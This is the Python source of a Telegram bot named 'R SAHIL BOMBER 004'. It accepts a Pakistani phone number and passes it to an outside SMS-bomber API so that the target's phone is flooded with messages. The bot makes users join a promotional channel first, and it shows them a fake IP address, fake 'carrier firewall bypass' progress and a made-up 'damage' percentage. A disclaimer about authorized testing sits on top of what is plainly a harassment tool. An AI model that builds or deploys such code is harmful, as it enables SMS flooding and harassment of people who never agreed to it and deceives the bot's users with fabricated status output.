import os
import random
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests

# Configuration
TOKEN = os.environ['BOT_TOKEN']
CHANNEL_ID = os.environ.get('CHANNEL_ID', '@kpksahil')
API_BASE_URL = "https://shadowscriptz.xyz/public_apis/smsbomberapi.php"

# Clean Messages (No markdown errors)
BANNER = """
R SAHIL BOMBER 004

Power: Military Grade
Danger Level: Extreme

Enter target number:
923XXXXXXXXX format only

Warning: For authorized testing only
"""

SUCCESS_MESSAGES = [
    "TARGET ACQUIRED - SMS warheads launched successfully",
    "MISSION SUCCESS - Target neutralized with SMS barrage",
    "STRIKE COMPLETE - Target phone is now buzzing"
]

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    await update.message.reply_text("Biometric Verification\nScanning your device...")
    
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status not in ["member", "administrator", "creator"]:
            keyboard = [[InlineKeyboardButton("JOIN CHANNEL", url=f"https://t.me/{CHANNEL_ID[1:]}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "Join channel first then use this tool",
                reply_markup=reply_markup
            )
            return
    except Exception as e:
        print(f"Channel check error: {e}")

    # Show fake IP and security info
    fake_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
    await update.message.reply_text(
        f"Your IP: {fake_ip}\n"
        f"VPN Detection: {random.choice(['Active','Not Detected'])}\n"
        f"System Status: Operational"
    )
    
    await update.message.reply_text(BANNER)

# Message Handler (Number Search)
async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        text = update.message.text.strip()
        
        # Input validation
        if not text.isdigit() or not text.startswith("92") or len(text) != 12:
            await update.message.reply_text("Invalid format! Use: 923XXXXXXXXX")
            return
        
        # Show attack simulation
        progress_msg = await update.message.reply_text("Connecting to satellite network...")
        await asyncio.sleep(1)
        await progress_msg.edit_text("Bypassing carrier firewall...")
        await asyncio.sleep(1)
        await progress_msg.edit_text("Deploying SMS warheads...")
        await asyncio.sleep(1)
        
        # API Call with better timeout
        url = f"{API_BASE_URL}?num={text}"
        try:
            response = requests.get(url, timeout=25)
            
            if response.status_code == 200:
                success_msg = random.choice(SUCCESS_MESSAGES)
                await progress_msg.edit_text(
                    f"R SAHIL BOMBER - Operation Complete\n\n"
                    f"{success_msg}\n"
                    f"Target: {text}\n"
                    f"Damage: {random.randint(85,99)}%"
                )
            else:
                await progress_msg.edit_text("Target defense systems activated\nTry different number")
                
        except requests.Timeout:
            await progress_msg.edit_text("Server overloaded! Try after 5 minutes")
        except requests.RequestException:
            await progress_msg.edit_text("Cyber warfare systems engaged\nTarget may be protected")
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        await update.message.reply_text("System malfunction! Contact support")

# Main function - SIMPLIFIED
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    
    # Clean startup without webhook conflicts
    print("R SAHIL BOMBER 004 - Bot Started")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()
